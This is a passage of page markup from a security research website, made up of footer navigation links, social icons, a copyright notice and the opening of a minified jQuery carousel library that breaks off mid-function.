c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995		C310,145.43,300.549,94.761,230.454,94.761z"/></g></svg></a>
																																													<a href="https://twitter.com/_cpresearch_" target="_blank"><svg  style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><g id="XMLID_826_"> <path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73	c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783	c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598	C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467	c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977	c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889	c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597	c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961	c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895	c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367	c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998	C307.394,57.037,305.009,56.486,302.973,57.388z"/></g></svg></a>
																																													<a href="https://www.facebook.com/checkpointresearch/" target="_blank"><svg style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><path id="XMLID_835_" d="M81.703,165.106h33.981V305c0,2.762,2.238,5,5,5h57.616c2.762,0,5-2.238,5-5V165.765h39.064		c2.54,0,4.677-1.906,4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899c-0.949-1.064-2.307-1.673-3.732-1.673h-44.996		V71.978c0-9.732,5.24-14.667,15.576-14.667c1.473,0,29.42,0,29.42,0c2.762,0,5-2.239,5-5V5.037c0-2.762-2.238-5-5-5h-40.545		C187.467,0.023,186.832,0,185.896,0c-7.035,0-31.488,1.381-50.804,19.151c-21.402,19.692-18.427,43.27-17.716,47.358v37.752H81.703		c-2.762,0-5,2.238-5,5v50.844C76.703,162.867,78.941,165.106,81.703,165.106z"/></svg></a>
																														</div>		
					</div>

					
				</div>
				<div class="flex-6 desktop-view">
					<div class="footer-menu-wrapper menu-wrap">
												<div class="nav-menu">
						<div class="nav-footer-wrap"><ul id="menu-footer-menus" class="nav-footer"><li id="menu-item-26658" class="blod menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-26658"><a href="#">Publications</a>
<ul class="sub-menu">
	<li id="menu-item-26659" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26659"><a href="/category/threat-intelligence-reports/">Global cyber attack reports</a></li>
	<li id="menu-item-26660" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26660"><a href="/category/threat-research/">Research publications</a></li>
	<li id="menu-item-26661" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26661"><a href="https://advisories.checkpoint.com/advisories/">IPS advisories</a></li>
	<li id="menu-item-26662" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26662"><a href="https://blog.checkpoint.com/">Check point blog</a></li>
	<li id="menu-item-26663" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26663"><a href="/category/demos/">Demos</a></li>
</ul>
</li>
<li id="menu-item-26664" class="blod menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-26664"><a href="#">Tools</a>
<ul class="sub-menu">
	<li id="menu-item-26665" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26665"><a href="http://threatemulation.checkpoint.com/">Sandblast file analysis</a></li>
	<li id="menu-item-26667" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26667"><a href="https://www.checkpoint.com/infinity/threatcloud/">ThreatCloud</a></li>
	<li id="menu-item-27018" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-27018"><a href="https://www.checkpoint.com/solutions/threat-intelligence-research/">Threat Intelligence</a></li>
	<li id="menu-item-27019" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-27019"><a href="https://www.checkpoint.com/infinity/zero-day-protection/">Zero day protection</a></li>
	<li id="menu-item-26668" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26668"><a href="https://threatmap.checkpoint.com/">Live threat map</a></li>
</ul>
</li>
<li id="menu-item-26669" class="blod menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-26669"><a href="https://research.checkpoint.com/about-us/">About Us</a>
<ul class="sub-menu">
	<li id="menu-item-26670" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26670"><a href="https://research.checkpoint.com/contact/">Contact Us</a></li>
</ul>
</li>
</ul></div>						</div>
											</div>
				</div>	
				<div class="flex-4 box right">
					<div class="text font-blue text-black">
						 <h3>Let’s get in touch</h3>
<p>Subscribe for cpr blogs, news and more</p>
<p><a href="/subscription/" style="color:#fff; font-weight: bold; text-decoration: underline;">Subscribe Now</a></p>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="footer-bottom font-white">
		<div class="container container-wide">
			<div class="flex-row footer-content">
				<div class="flex-6 box-left"><div class="display-flex align-items-center"><p>© 1994-2024 Check Point Software Technologies LTD. All rights reserved.</p>
 </div></div>
				<div class="flex-6">
					<div class="footer-bottom-right">
						<div class="box padding-right"><p>Property of <a href="https://www.checkpoint.com/">CheckPoint.com</a></p>
</div>
						<div class="box"><p><a href="/privacy-policy/">Privacy Policy</a></p>
</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</footer><script>
/* slick slider */
!function(b){"function"==typeof define&&define.amd?define(["jquery"],b):"undefined"!=typeof exports?module.exports=b(require("jquery")):b(jQuery)}(function(d){var c=window.Slick||{};c=function(){function e(i,h){var b,g=this;g.defaults={accessibility:!0,adaptiveHeight:!1,appendArrows:d(i),appendDots:d(i),arrows:!0,asNavFor:null,prevArrow:'<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',nextArrow:'<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',autoplay:!1,autoplaySpeed:3000,centerMode:!1,centerPadding:"50px",cssEase:"ease",customPaging:function(f,j){return d('<button type="button" data-role="none" role="button" tabindex="0" />').text(j+1)},dots:!1,dotsClass:"slick-dots",draggable:!0,easing:"linear",edgeFriction:0.35,fade:!1,focusOnSelect:!1,infinite:!0,initialSlide:0,lazyLoad:"ondemand",mobileFirst:!1,pauseOnHover:!0,pauseOnFocus:!0,pauseOnDotsHover:!1,respondTo:"window",responsive:null,rows:1,rtl:!1,slide:"",slidesPerRow:1,slidesToShow:1,slidesToScroll:1,speed:500,swipe:!0,swipeToSlide:!1,touchMove:!0,touchThreshold:5,useCSS:!0,useTransform:!0,variableWidth:!1,vertical:!1,verticalSwiping:!1,waitForAnimate:!0,zIndex:1000},g.initials={animating:!1,dragging:!1,autoPlayTimer:null,currentDirection:0,currentLeft:null,currentSlide:0,direction:1,$dots:null,listWidth:null,listHeight:null,loadIndex:0,$nextArrow:null,$prevArrow:null,slideCount:null,slideWidth:null,$slideTrack:null,$slides:null,sliding:!1,slideOffset:0,swipeLeft:null,$list:null,touchObject:{},transformsEnabled:!1,unslicked:!1},d.extend(g,g.initials),g.activeBreakpoint=null,g.animType=null,g.animProp=null,g.breakpoints=[],g.breakpointSettings=[],g.cssTransitions=!1,g.focussed=!1,g.interrupted=!1,g.hidden="hidden",g.paused=!0,g.positionProp=null,g.respondTo=null,g.rowCount=1,g.shouldClick=!0,g.$slider=d(i),g.$slidesCache=null,g.transformType=null,g.transitionType=null,g.visibilityChange="visibilitychange",g.windowWidth=0,g.windowTimer=null,b=d(i).data("slick")||{},g.options=d.extend({},g.defaults,h,b),g.currentSlide=g.options.initialSlide,g.originalSettings=g.options,"undefined"!=typeof document.mozHidden?(g.hidden="mozHidden",g.visibilityChange="mozvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(g.hidden="webkitHidden",g.visibilityChange="webkitvisibilitychange"),g.autoPlay=d.proxy(g.autoPlay,g),g.autoPlayClear=d.proxy(g.autoPlayClear,g),g.autoPlayIterator=d.proxy(g.autoPlayIterator,g),g.changeSlide=d.proxy(g.changeSlide,g),g.clickHandler=d.proxy(g.clickHandler,g),g.selectHandler=d.proxy(g.selectHandler,g),g.setPosition=d.proxy(g.setPosition,g),g.swipeHandler=d.proxy(g.swipeHandler,g),g.dragHandler=d.proxy(g.dragHandler,g),g.keyHandler=d.proxy(g.keyHandler,g),g.instanceUid=a++,g.htmlExpr=/^(?:\s*(<[\w\W]+>)[^>]*)$/,g.registerBreakpoints(),g.init(!0)}var a=0;return e}(),c.prototype.activateADA=function(){var b=this;b.$slideTrack.find(".slick-active").attr({"aria-hidden":"false"}).find("a, input, button, select").attr({tabindex:"0"})},c.prototype.addSlide=c.prototype.slickAdd=function(a,h,g){var f=this;if("boolean"==typeof h){g=h,h=null}else{if(0>h||h>=f.slideCount){return !1}}f.unload(),"number"==typeof h?0===h&&0===f.$slides.length?d(a).appendTo(f.$slideTrack):g?d(a).insertBefore(f.$slides.eq(h)):d(a).insertAfter(f.$slides.eq(h)):g===!0?d(a).prependTo(f.$slideTrack):d(a).appendTo(f.$slideTrack),f.$slides=f.$slideTrack.children(this.options.slide),f.$slideTrack.children(this.options.slide).detach(),f.$slideTrack.append(f.$slides),f.$slides.each(function(e,i){d(i).attr("data-slick-index",e)}),f.$slidesCache=f.$slides,f.reinit()},c.prototype.animateHeight=function(){var f=this;if(1===f.options.slidesToShow&&f.options.adaptiveHeight===!0&&f.options.vertical===!1){var e=f.$slides.eq(f.currentSlide).outerHeight(!0);f.$list.animate({height:e},f.options.speed)}},c.prototype.animateSlide=function(a,h){var g={},f=this;f.animateHeight(),f.options.rtl===!0&&f.options.vertical===!1&&(a=-a),f.transformsEnabled===!1?f.options.vertical===!1?f.$slideTrack.animate({left:a},f.options.speed,f.options.easing,h):f.$slideTrack.animate({top:a},f.options.speed,f.options.easing,h):f.cssTransitions===!1?(f.options.rtl===!0&&(f.currentLeft=-f.currentLeft),d({animStart:f.currentLeft}).animate({animStart:a},{duration:f.options.speed,easing:f.options.easing,step:function(b){b=Math.ceil(b),f.options.vertical===!1?(g[f.animType]="translate("+b+"px, 0px)",f.$slideTrack.css(g)):(g[f.animType]="translate(0px,"+b+"px)",f.$slideTrack.css(g))},complete:function(){h&&h.call()}})):(f.applyTransition(),a=Math.ceil(a),f.options.vertical===!1?g[f.animType]="translate3d("+a+"px, 0px, 0px)":g[f.animType]="translate3d(0px,"+a+"px, 0px)",f.$slideTrack.css(g),h&&setTimeout(function(){f.disableTransition(),h.call()},f.options.speed))},c.prototype.getNavTarget=function(){var a=this,e=a.options.asNavFor;return e&&null!==e&&(e=d(e).not(a.$slider)),e},c.prototype.asNavFor=function(a){var f=this,e=f.getNavTarget();null!==e&&"object"==typeof e&&e.each(function(){var b=d(this).slick("getSlick");b.unslicked||b.slideHandler(a,!0)})},c.prototype.applyTransition=function(f){var e=this,g={};e.options.fade===!1?g[e.transitionType]=e.transformType+" "+e.options.speed+"ms "+e.options.cssEase:g[e.transitionType]="opacity "+e.options.speed+"ms "+e.options.cssEase,e.options.fade===!1?e.$slideTrack.css(g):e.$slides.eq(f).css(g)},c.prototype.autoPlay=function(){var b=this;b.autoPlayClear(),b.slideCount>b.options.slidesToShow&&(b.autoPlayTimer=setInterval(b.autoPlayIterator,b.options.autoplaySpeed))},c.prototype.autoPlayClear=function(){var b=this;b.autoPlayTimer&&clearInterval(b.autoPlayTimer)},c.prototype.autoPlayIterator=function(){var f=this,e=f.currentSlide+f.options.slidesToScroll;f.paused||f.interrupted||f.focussed||(f.options.infinite===!1&&(1===f.direction&&f.currentSlide+1===f.slideCount-1?f.direction=0:0===f.direction&&(e=f.currentSlide-f.options.slidesToScroll,f.currentSlide-1===0&&(f.direction=1))),f.slideHandler(e))},c.prototype.buildArrows=function(){var a=this;a.options.arrows===!0&&(a.$prevArrow=d(a.options.prevArrow).addClass("slick-arrow"),a.$nextArrow=d(a.options.nextArrow).addClass("slick-arrow"),a.slideCount>a.options.slidesToShow?(a.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),a.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),a.htmlExpr.test(a.options.prevArrow)&&a.$prevArrow.prependTo(a.options.appendArrows),a.htmlExpr.test(a.options.nextArrow)&&a.$nextArrow.appendTo(a.options.appendArrows),a.options.infinite!==!0&&a.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true")):a.$prevArrow.add(a.$nextArrow).addClass("slick-hidden").attr({"aria-disabled":"true",tabindex:"-1"}))},c.prototype.buildDots=function(){var f,e,a=this;if(a.options.dots===!0&&a.slideCount>a.options.slidesToShow){for(a.$slider.addClass("slick-dotted"),e=d("<ul />").addClass(a.options.dotsClass),f=0;f<=a.getDotCount();f+=1){e.append(d("<li />").append(a.options.customPaging.call(this,a,f)))}a.$dots=e.appendTo(a.options.appendDots),a.$dots.find("li").first().addClass("slick-active").attr("aria-hidden","false")}},c.prototype.buildOut=function(){var a=this;a.$slides=a.$slider.children(a.options.slide+":not(.slick-cloned)").addClass("slick-slide"),a.slideCount=a.$slides.length,a.$slides.each(function(e,f){d(f).attr("data-slick-index",e).data("originalStyling",d(f).attr("style")||"")}),a.$slider.addClass("slick-slider"),a.$slideTrack=0===a.slideCount?d('<div class="slick-track"/>').appendTo(a.$slider):a.$slides.wrapAll('<div class="slick-track"/>').parent(),a.$list=a.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent(),a.$slideTrack.css("opacity",0),(a.options.centerMode===!0||a.options.swipeToSlide===!0)&&(a.options.slidesToScroll=1),d("img[data-lazy]",a.$slider).not("[src]").addClass("slick-loading"),a.setupInfinite(),a.buildArrows(),a.buildDots(),a.updateDots(),a.setSlideClasses("number"==typeof a.currentSlide?a.currentSlide:0),a.options.draggable===!0&&a.$list.addClass("draggable")},c.prototype.buildRows=function(){var u,t,s,r,q,p,o,v=this;if(r=document.createDocumentFragment(),p=v.$slider.children(),v.options.rows>1){for(o=v.options.slidesPerRow*v.options.rows,q=Math.ceil(p.length/o),u=0;q>u;u++){var n=document.createElement("div");for(t=0;t<v.options.rows;t++){var m=document.createElement("div");for(s=0;s<v.options.slidesPerRow;s++){var l=u*o+(t*v.options.slidesPerRow+s);p.get(l)&&m.appendChild(p.get(l))}n.appendChild(m)}r.appendChild(n)}v.$slider.empty().append(r),v.$slider.children().children().children().css({width:100/v.options.slidesPerRow+"%",display:"inline-block"})}},c.prototype.checkResponsive=function(r,q){var o,n,m,p=this,l=!1,k=p.$slider.width(),a=window.innerWidth||d(window).width();if("window"===p.respondTo?m=a:"slider"===p.respondTo?m=k:"min"===p.respondTo&&(m=Math.min(a,k)),p.options.responsive&&p.options.responsive.length&&null!==p.options.responsive){n=null;for(o in p.breakpoints){p.breakpoints.hasOwnProperty(o)&&(p.originalSettings.mobileFirst===!1?m<p.breakpoints[o]&&(n=p.breakpoints[o]):m>p.breakpoints[o]&&(n=p.breakpoints[o]))}null!==n?null!==p.activeBreakpoint?(n!==p.activeBreakpoint||q)&&(p.activeBreakpoint=n,"unslick"===p.breakpointSettings[n]?p.unslick(n):(p.options=d.extend({},p.originalSettings,p.breakpointSettings[n]),r===!0&&(p.currentSlide=p.options.initialSlide),p.refresh(r)),l=n):(p.activeBreakpoint=n,"unslick"===p.breakpointSettings[n]?p.unslick(n):(p.options=d.extend({},p.originalSettings,p.breakpointSettings[n]),r===!0&&(p.currentSlide=p.options.initialSlide),p.refresh(r)),l=n):null!==p.activeBreakpoint&&(p.activeBreakpoint=null,p.options=p.originalSettings,r===!0&&(p.currentSlide=p.options.initialSlide),p.refresh(r),l=n),r||l===!1||p.$slider.trigger("breakpoint",[p,l])}},c.prototype.changeSlide=function(a,p){var m,l,k,o=this,n=d(a.currentTarget);switch(n.is("a")&&a.preventDefault(),n.is("li")||(n=n.closest("li")),k=o.slideCount%o.options.slidesToScroll!==0,m=k?0:(o.slideCount-o.currentSlide)%o.options.slidesToScroll,a.data.message){case"previous":l=0===m?o.options.slidesToScroll:o.options.slidesToShow-m,o.slideCount>o.options.slidesToShow&&o.slideHandler(o.currentSlide-l,!1,p);break;case"next":l=0===m?o.options.slidesToScroll:m,o.slideCount>o.options.slidesToShow&&o.slideHandler(o.currentSlide+l,!1,p);break;case"index":var j=0===a.data.index?0:a.data.index||n.index()*o.options.slidesToScroll;o.slideHandler(o.checkNavigable(j),!1,p),n.children().trigger("focus");break;default:return}},c.prototype.checkNavigable=function(g){var j,i,f=this;if(j=f.getNavigableIndexes(),i=0,g>j[j.length-1]){g=j[j.length-1]}else{for(var h in j){if(g<j[h]){g=i;break}i=j[h]}}return g},c.prototype.cleanUpEvents=function(){var a=this;a.options.dots&&null!==a.$dots&&d("li",a.$dots).off("click.slick",a.changeSlide).off("mouseenter.slick",d.proxy(a.interrupt,a,!0)).off("mouseleave.slick",d.proxy(a.interrupt,a,!1)),a.$slider.off("focus.slick blur.slick"),a.options.arrows===!0&&a.slideCount>a.options.slidesToShow&&(a.$prevArrow&&a.$prevArrow.off("click.slick",a.changeSlide),a.$nextArrow&&a.$nextArrow.off("click.slick",a.changeSlide)),a.$list.off("touchstart.slick mousedown.slick",a.swipeHandler),a.$list.off("touchmove.slick mousemove.slick",a.swipeHandler),a.$list.off("touchend.slick mouseup.slick",a.swipeHandler),a.$list.off("touchcancel.slick mouseleave.slick",a.swipeHandler),a.$list.off("click.slick",a.clickHandler),d(document).off(a.visibilityChange,a.visibility),a.cleanUpSlideEvents(),a.options.accessibility===!0&&a.$list.off("keydown.slick",a.keyHandler),a.options.focusOnSelect===!0&&d(a.$slideTrack).children().off("click.slick",a.selectHandler),d(window).off("orientationchange.slick.slick-"+a.instanceUid,a.orientationChange),d(window).off("resize.slick.slick-"+a.instanceUid,a.resize),d("[draggable!=true]",a.$slideTrack).off("dragstart",a.preventDefault),d(window).off("load.slick.slick-"+a.instanceUid,a.setPosition),d(document).off("ready.slick.slick-"+a.instanceUid,a.setPosition)},c.prototype.cleanUpSlideEvents=function(){var a=this;a.$list.off("mouseenter.slick",d.proxy(a.interrupt,a,!0)),a.$list.off("mouseleave.slick",d.proxy(a.interrupt,a,!1))},c.prototype.cleanUpRows=function(){var e,f=this;f.options.rows>1&&(e=f.$slides.children().children(),e.removeAttr("style"),f.$slider.empty().append(e))},c.prototype.clickHandler=function(f){var e=this;e.shouldClick===!1&&(f.stopImmediatePropagation(),f.stopPropagation(),f.preventDefault())},c.prototype.destroy=function(a){var e=this;e.autoPlayClear(),e.touchObject={},e.cleanUpEvents(),d(".slick-cloned",e.$slider).detach(),e.$dots&&e.$dots.remove(),e.$prevArrow&&e.$prevArrow.length&&(e.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),e.htmlExpr.test(e.options.prevArrow)&&e.$prevArrow.remove()),e.$nextArrow&&e.$nextArrow.length&&(e.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),e.htmlExpr.test(e.options.nextArrow)&&e.$nextArrow.remove()),e.$slides&&(e.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function(){d(this).attr("style",d(this).data("originalStyling"))}),e.$slideTrack.children(this.options.slide).detach(),e.$slideTrack.detach(),e.$list.detach(),e.$slider.append(e.$slides)),e.cleanUpRows(),e.$slider.removeClass("slick-slider"),e.$slider.removeClass("slick-initialized"),e.$slider.removeClass("slick-dotted"),e.unslicked=!0,a||e.$slider.trigger("destroy",[e])},c.prototype.disableTransition=function(f){var e=this,g={};g[e.transitionType]="",e.options.fade===!1?e.$slideTrack.css(g):e.$slides.eq(f).css(g)},c.prototype.fadeSlide=function(f,e){var g=this;g.cssTransitions===!1?(g.$slides.eq(f).css({zIndex:g.options.zIndex}),g.$slides.eq(f).animate({opacity:1},g.options.speed,g.options.easing,e)):(g.applyTransition(f),g.$slides.eq(f).css({opacity:1,zIndex:g.options.zIndex}),e&&setTimeout(function(){g.disableTransition(f),e.call()},g.options.speed))},c.prototype.fadeSlideOut=function(f){var e=this;e.cssTransitions===!1?e.$slides.eq(f).animate({opacity:0,zIndex:e.options.zIndex-2},e.options.speed,e.options.easing):(e.applyTransition(f),e.$slides.eq(f).css({opacity:0,zIndex:e.options.zIndex-2}))},c.prototype.filterSlides=c.prototype.slickFilter=function(f){var e=this;null!==f&&(e.$slidesCache=e.$slides,e.unload(),e.$slideTrack.children(this.options.slide).detach(),e.$slidesCache.filter(f).appendTo(e.$slideTrack),e.reinit())},c.prototype.focusHandler=function(){var a=this;a.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick","*:not(.slick-arrow)",function(e){e.stopImmediatePropagation();var b=d(this);setTimeout(function(){a.options.pauseOnFocus&&(a.focussed=b.is(":focus"),a.autoPlay())},0)})},c.prototype.getCurrent=c.prototype.slickCurrentSlide=function(){var b=this;return b.currentSlide},c.prototype.getDotCount=function(){var f=this,e=0,h=0,g=0;if(f.options.infinite===!0){for(;e<f.slideCount;){++g,e=h+f.options.slidesToScroll,h+=f.options.slidesToScroll<=f.options.slidesToShow?f.options.slidesToScroll:f.options.slidesToShow}}else{if(f.options.centerMode===!0){g=f.slideCount}else{if(f.options.asNavFor){for(;e<f.slideCount;){++g,e=h+f.options.slidesToScroll,h+=f.options.slidesToScroll<=f.options.slidesToShow?f.options.slidesToScroll:f.options.slidesToShow}}else{g=1+Math.ceil((f.slideCount-f.options.slidesToShow)/f.options.slidesToScroll)}}}return g-1},c.prototype.getLeft=function(h){var l,k,i,g=this,j=0;return g.slideOffset=0,k=g.$slides.first().outerHeight(!0),g.options.infinite===!0?(g.slideCount>g.options.slidesToShow&&(g.slideOffset=g.slideWidth*g.options.slidesToShow*-1,j=k*g.options.slidesToShow*-1),g.slideCount%g.options.slidesToScroll!==0&&h+g.options.slidesToScroll>g.slideCount&&g.slideCount>g.options.slidesToShow&&(h>g.slideCount?(g.slideOffset=(g.options.slidesToShow-(h-g.slideCount))*g.slideWidth*-1,j=(g.options.slidesToShow-(h-g.slideCount))*k*-1):(g.slideOffset=g.slideCount%g.options.slidesToScroll*g.slideWidth*-1,j=g.slideCount%g.options.slidesToScroll*k*-1))):h+g.options.slidesToShow>g.slideCount&&(g.slideOffset=(h+g.options.slidesToShow-g.slideCount)*g.slideWidth,j=(h+g.options.slidesToShow-g.slideCount)*k),g.slideCount<=g.options.slidesToShow&&(g.slideOffset=0,j=0),g.options.centerMode===!0&&g.options.infinite===!0?g.slideOffset+=g.slideWidth*Math.floor(g.options.slidesToShow/2)-g.slideWidth:g.options.centerMode===!0&&(g.slideOffset=0,g.slideOffset+=g.slideWidth*Math.floor(g.options.slidesToShow/2)),l=g.options.vertical===!1?h*g.slideWidth*-1+g.slideOffset:h*k*-1+j,g.options.variableWidth===!0&&(i=g.slideCount<=g.options.slidesToShow||g.options.infinite===!1?g.$slideTrack.children(".slick-slide").eq(h):g.$slideTrack.children(".slick-slide").eq(h+g.options.slidesToShow),l=g.options.rtl===!0?i[0]?-1*(g.$slideTrack.width()-i[0].offsetLeft-i.width()):0:i[0]?-1*i[0].offsetLeft:0,g.options.centerMode===!0&&(i=g.slideCount<=g.options.slidesToShow||g.options.infinite===!1?g.$slideTrack.children(".slick-slide").eq(h):g.$slideTrack.children(".slick-slide").eq(h+g.options.slidesToShow+1),l=g.options.rtl===!0?i[0]?-1*(g.$slideTrack.width()-i[0].offsetLeft-i.width()):0:i[0]?-1*i[0].offsetLeft:0,l+=(g.$list.width()-i.outerWidth())/2)),l},c.prototype.getOption=c.prototype.slickGetOption=function(f){var e=this;return e.options[f]},c.prototype.getNavigableIndexes=function(){var h,g=this,f=0,j=0,i=[];for(g.options.infinite===!1?h=g.slideCount:(f=-1*g.options.slidesToScroll,j=-1*g.options.slidesToScroll,h=2*g.slideCount);h>f;){i.push(f),f=j+g.options.slidesToScroll,j+=g.options.slidesToScroll<=g.options.slidesToShow?g.options.slidesToScroll:g.options.slidesToShow}return i},c.prototype.getSlick=function(){return this},c.prototype.getSlideCount=function(){var h,g,f,a=this;return f=a.options.centerMode===!0?a.slideWidth*Math.floor(a.options.slidesToShow/2):0,a.options.swipeToSlide===!0?(a.$slideTrack.find(".slick-slide").each(function(e,b){return b.offsetLeft-f+d(b).outerWidth()/2>-1*a.swipeLeft?(g=b,!1):void 0}),h=Math.abs(d(g).attr("data-slick-index")-a.currentSlide)||1):a.options.slidesToScroll},c.prototype.goTo=c.prototype.slickGoTo=function(f,e){var g=this;g.changeSlide({data:{message:"index",index:parseInt(f)}},e)},c.prototype.init=function(a){var e=this;d(e.$slider).hasClass("slick-initialized")||(d(e.$slider).addClass("slick-initialized"),e.buildRows(),e.buildOut(),e.setProps(),e.startLoad(),e.loadSlider(),e.initializeEvents(),e.updateArrows(),e.updateDots(),e.checkResponsive(!0),e.focusHandler()),a&&e.$slider.trigger("init",[e]),e.options.accessibility===!0&&e.initADA(),e.options.autoplay&&(e.paused=!1,e.autoPlay())},c.prototype.initADA=function(){var a=this;a.$slides.add(a.$slideTrack.find(".slick-cloned")).attr({"aria-hidden":"true",tabindex:"-1"}).find("a, input, button, select").attr({tabindex:"-1"}),a.$slideTrack.attr("role","listbox"),a.$slides.not(a.$slideTrack.find(".slick-cloned")).each(function(b){d(this).attr({role:"option","aria-describedby":"slick-slide"+a.instanceUid+b})}),null!==a.$dots&&a.$dots.attr("role","tablist").find("li").each(function(b){d(this).attr({role:"presentation","aria-selected":"false","aria-controls":"navigation"+a.instanceUid+b,id:"slick-slide"+a.instanceUid+b})}).first().attr("aria-selected","true").end().find("button").attr("role","button").end().closest("div").attr("role","toolbar"),a.activateADA()},c.prototype.initArrowEvents=function(){var b=this;b.options.arrows===!0&&b.slideCount>b.options.slidesToShow&&(b.$prevArrow.off("click.slick").on("click.slick",{message:"previous"},b.changeSlide),b.$nextArrow.off("click.slick").on("click.slick",{message:"next"},b.changeSlide))},c.prototype.initDotEvents=function(){var a=this;a.options.dots===!0&&a.slideCount>a.options.slidesToShow&&d("li",a.$dots).on("click.slick",{message:"index"},a.changeSlide),a.options.dots===!0&&a.options.pauseOnDotsHover===!0&&d("li",a.$dots).on("mouseenter.slick",d.proxy(a.interrupt,a,!0)).on("mouseleave.slick",d.proxy(a.interrupt,a,!1))},c.prototype.initSlideEvents=function(){var a=this;a.options.pauseOnHover&&(a.$list.on("mouseenter.slick",d.proxy(a.interrupt,a,!0)),a.$list.on("mouseleave.slick",d.proxy(a.interrupt,a,!1)))},c.prototype.initializeEvents=function(){var a=this;a.initArrowEvents(),a.initDotEvents(),a.initSlideEvents(),a.$list.on("touchstart.slick mousedown.slick",{action:"start"},a.swipeHandler),a.$list.on("touchmove.slick mousemove.slick",{action:"move"},a.swipeHandler),a.$list.on("touchend.slick mouseup.slick",{action:"end"},a.swipeHandler),a.$list.on("touchcancel.slick mouseleave.slick",{action:"end"},a.swipeHandler),a.$list.on("click.slick",a.clickHandler),d(document).on(a.visibilityChange,d.proxy(a.visibility,a)),a.options.accessibility===!0&&a.$list.on("keydown.slick",a.keyHandler),a.options.focusOnSelect===!0&&d(a.$slideTrack).children().on("click.slick",a.selectHandler),d(window).on("orientationchange.slick.slick-"+a.instanceUid,d.proxy(a.orientationChange,a)),d(window).on("resize.slick.slick-"+a.instanceUid,d.proxy(a.resize,a)),d("[draggable!=true]",a.$slideTrack).on("dragstart",a.preventDefault),d(window).on("load.slick.slick-"+a.instanceUid,a.setPosition),d(document).on("ready.slick.slick-"+a.instanceUid,a.setPosition)},c.prototype.initUI=function(){var b=this;b.options.arrows===!0&&b.slideCount>b.options.slidesToShow&&(b.$prevArrow.show(),b.$nextArrow.show()),b.options.dots===!0&&b.slideCount>b.options.slidesToShow&&b.$dots.show()},c.prototype.keyHandler=function(f){var e=this;f.target.tagName.match("TEXTAREA|INPUT|SELECT")||(37===f.keyCode&&e.options.accessibility===!0?e.changeSlide({data:{message:e.options.rtl===!0?"next":"previous"}}):39===f.keyCode&&e.options.accessibility===!0&&e.changeSlide({data:{message:e.options.rtl===!0?"previous":"next"}}))},c.prototype.lazyLoad=function(){function h(b){d("img[data-lazy]",b).each(function(){var 